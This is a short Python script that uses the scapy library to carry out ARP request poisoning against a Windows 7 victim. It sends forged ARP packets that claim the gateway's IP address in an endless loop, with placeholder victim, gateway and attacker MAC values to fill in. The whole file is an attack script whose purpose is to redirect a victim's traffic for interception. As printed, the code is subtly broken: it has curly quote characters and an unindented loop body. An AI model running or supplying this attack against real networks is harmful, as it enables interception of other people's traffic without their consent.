#!/usr/bin/env python
#
# ARP Request Poisoning
# Win7
#
from scapy.all import *
import time

op=1 # Op code 1 - ARP requests
victim=’10.10.13.113’ # Replace with Victim’s IP
spoof=’10.10.13.1’ # Replace with Gateway’s IP
mac=’00:0c:29:ec:55:7b’ # Replace with Attacker’s Phys. Addr.

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
send(arp)
time.sleep(2)